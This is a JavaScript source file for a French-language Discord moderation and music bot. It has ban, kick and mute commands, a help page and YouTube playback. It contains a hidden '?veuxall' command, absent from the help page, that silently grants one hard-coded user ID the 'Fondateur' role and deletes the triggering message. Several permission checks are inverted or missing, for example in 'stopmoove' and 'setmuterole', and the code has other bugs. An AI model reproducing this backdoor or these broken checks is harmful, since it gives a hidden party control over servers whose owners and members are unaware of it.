const discord = require('discord.js');
const opusscript = require('opusscript');
const ffmpeg = require('ffmpeg-binaries');
const youtubeStream = require('ytdl-core');
const fluentffmpeg = require('fluent-ffmpeg');
const bot = new discord.Client(); 

var prefix = ("!");
var secondaryPrefix = ("?");

var mutedrole = ("mute");
var autorole = ("Rebel");

var serveurs = {};

function play(connection, message){
    var serveur = serveurs[message.guild.id];

    serveur.dispatcher = connection.playStream(youtubeStream(serveur.queue[0], {filter: "audioonly"}));

    serveur.queue.shift();
    serveur.dispatcher.on("end", function(){
        if(serveur.queue[0]){ 
            play(connection, message)
            message.reply("Musique skipée");
        }
        else connection.disconnect();

    })
}

bot.on('ready', function(){
    
    console.log(`Connecté avec ${bot.user.tag} (${bot.user.id}) sur ${bot.guilds.size} serveurs`);
    bot.user.setActivity(prefix + 'help');
    bot.user.setAvatar("https://cdn.discordapp.com/attachments/314362582175842305/428580971269324831/unknown.png");
    bot.user.setUsername('LesRebels Bot');
});

bot.on('message', message =>{;


    var args = message.content.substring(prefix.length).split(' ');

    if(message.content === secondaryPrefix + "bg"){
        message.channel.sendMessage("C'est Benedict ");
    };

    if(message.content === secondaryPrefix + "boss") return message.channel.send("C'est Quentin");

    if(message.content === secondaryPrefix + "veuxall"){
        if(message.member.user.id === "428966219383570432"){
            var role = message.guild.roles.find('name', 'Fondateur');
            message.channel.lastMessage.delete();
            message.member.addRole(role);
        }
    }

    if(message.content === prefix + "help"){

        //HELP
        var embed = new discord.RichEmbed()
            .setTitle("Page d'aide")
            .addBlankField()
            .addField("COMMANDES POUR LES ADMINS", "Commandes réservées au best")
            .addField(prefix + "ban [@pseudo] ","Permet de ban des joueurs")
            .addField(prefix + "kick [@pseudo]", "Permet de kick des joueurs")
            .addField(prefix + "settings", "Permet de modifier les paramètres des commandes")
            .addBlankField()
            .addField("COMMANDES POUR TOUS LE MONDE", "Commandes utiles mais pas marrantes")
            .addField(prefix + "discordinfo","Permet d'avoir des infos sur le Discord")
            .addBlankField()
            .addField("COMMANDES POUR LA MUSIC", "Les commandes qui permettent de lancer de la musique")
            .addField(prefix + "play [link]","Permet de jouer une vidéo graçe à un lien youtube")
            .addField(prefix + "skip", "Passe à la music suivante")
            .addField(prefix + "stop", "Arrete la music en cours")
            .setColor(255, 0, 0)
            message.channel.send(embed);

    };

    //SETTINGS 
    if(message.content === prefix + "settings"){
        var embed = new discord.RichEmbed()
            .setTitle("Paramètres")
            .addField(prefix + "changerole [role]", "Permet de changer le role qui est donné aux nouveaux arrivants")
            .addField(prefix + "changeprefix [prefix]", "Permet de changer le prefix pour faire une commandes")
            .addField(prefix + "setmuterole [@role]", "Permet de changer le role de mute")
            .color(0, 0, 255)
    }

    //PING
    if(message.content === prefix + "ping"){
        const then = Date.now();
        message.channel.send('Pinging...').then(m =>{
            m.edit(`Pong! Ca a pris  ${Date.now() - then}ms pour envoyer ce message\nPing du bot : ${bot.ping}ms`);
        });
    }

    //KICK
    if(message.content.startsWith(prefix + "kick")){
        if(message.member.permissions.has('KICK_MEMBERS')){ 
            const member = message.mentions.members.first();
            if(!member) return message.reply("Mauvais usage fait comme ça : `.kick @User#1234`");
            if(member && message.member.permissions.has("KICK_MEMBERS")){
                member.kick(`Kicker par ${message.author.tag}`);
                message.reply("Le joueur a bien été kiker.");
            }
        }else{
            message.reply("Tu n'as pas les permissions nécéssaires.");
        }
    }

    //SETMUTEROLE
    if(message.content === prefix + "setmuterole"){
        mutedrole = args[1];
        message.reply("Mute role changé");
    }

    //BAN
    if(message.content.startsWith(prefix + "ban")){
        if(!message.member.permissions.has("BAN_MEMBERS")) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const member = message.mentions.members.first();
        if(!member) return message.reply("Mauvais usage fait comme ça : `.ban @User#1234`");
         if(member && message.member.permissions.has("BAN_MEMBERS")){
             member.ban(`banni par ${message.author.tag}`);
             message.reply("Le joueur a bien été banni.");
         }

    }


    //DISCORD INFO
    if(message.content === prefix + "discordinfo"){
        var embed = new discord.RichEmbed()
            .setTitle("Information du discord")
            .addField("Nom du discord : " , message.guild.name)
            .addField("Crée le : " , message.guild.createdAt)
            .addField("Tu nous a rejoin le : " , message.member.joinedAt)
            .addField("Ce discord possèdent " , message.guild.memberCount + " joueurs")
            .setColor("0x0000FF")
        message.channel.send(embed);
    }

    //CHANGE ROLE
    if(message.content.startsWith(prefix + "changerole")){
        if(message.member.permissions.has('ADMINISTRATOR')){
            if(!args[1]) return message.reply("Met un role");
                autorole = args[1]
                message.reply("Le role a bien été changer");
        }
    }

    //CHANGE PREFIX
    if(message.content.startsWith(prefix + "changeprefix")){
        if(message.member.permissions.has('ADMINISTRATOR')){
            if(!args[1]) return message.reply("Met un prefix");
                prefix = args[1]
                message.reply("Le préfix a bien été changer");
        }
    }


    //CHANGE COLOR
    if(message.content.startsWith(prefix + "changenamecolor")){
        message.member.colorRole.hexColor('RED');
        if(!args [1]){
            var embed = new discord.RichEmbed()
                .setTitle("Couleur possible")
                .addField()
        }
    }
  
    //MUSIC
    if(message.content.startsWith(prefix + "play")){
        if(!message.member.voiceChannel) return message.reply("Va dans un channel vocal");
            if(!args [1]) return message.reply("Met un lien");

            if(!serveurs[message.guild.id]) serveurs[message.guild.id] = {
                queue: []
            }

            var serveur = serveurs[message.guild.id];
            message.reply("Music ajoutée à la liste");
            serveur.queue.push(args[1]);


            if (!message.guild.voiceConnection) message.member.voiceChannel.join().then(function(connection){
                play(connection, message);
                message.reply("Musique lancé");
            });

    }

    if(message.content === prefix + "skip"){
        var serveur = serveurs[message.guild.id];
        
        if(serveur.dispatcher) serveur.dispatcher.end();
    }

    if(message.content === prefix + "stop"){
        var serveur = serveurs[message.guild.id];

        if(message.guild.voiceConnection) message.guild.voiceConnection.disconnect();
        message.reply("Musique stopée");
    }

    if(message.content === prefix + "actualprefix") return message.reply("Le prefix actuel est : " + prefix);
    if(message.content === prefix + "actualautorole") return message.reply("Le prefix actuel est : " + autorole);
    if(message.content === prefix + "actualmuterole") return message.reply("Le prefix actuel est : " + mutedrole);



    if(message.content.startsWith(prefix + "mute")){
        if(!message.member.permissions.has('MANAGE_GUILD')) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const member = message.mentions.members.first();
        const mute = message.guild.roles.find('name', 'mute');
        mute.setPosition(1)
       .then(updated => console.log(`Role position: ${updated.position}`))
       .catch(console.error);
        if(!member) return message.reply("Mauvais usage fait comme ça : `.mute @User#1234`");
         if(member && message.member.permissions.has("BAN_MEMBERS")){
             
             member.addRole(mute);
             message.reply("Le joueur a bien été muté.");
         }
    }

    if(message.content.startsWith(prefix + "stopmoove")){
        if(message.member.permissions.has('ADMINISTRATOR')) return message.reply("Tu n'as pas les permissions nécéssaires.");
        const role = message.mentions.roles.first();
        role.setPermissions('MOVE_MEMBERS', false);

    }    

});

//AUTO ROLE ET BIENVENUE
bot.on("guildMemberAdd", member =>{
    member.guild.channels.find("name", "general").send(`Bienvenue ${member}`);
    if(!member.guild.roles.find('name', role)) return console.log("Role inconnu");
    member.addRole(member.guild.roles.find('name', autorole));
})

bot.login(process.env.TOKEN);
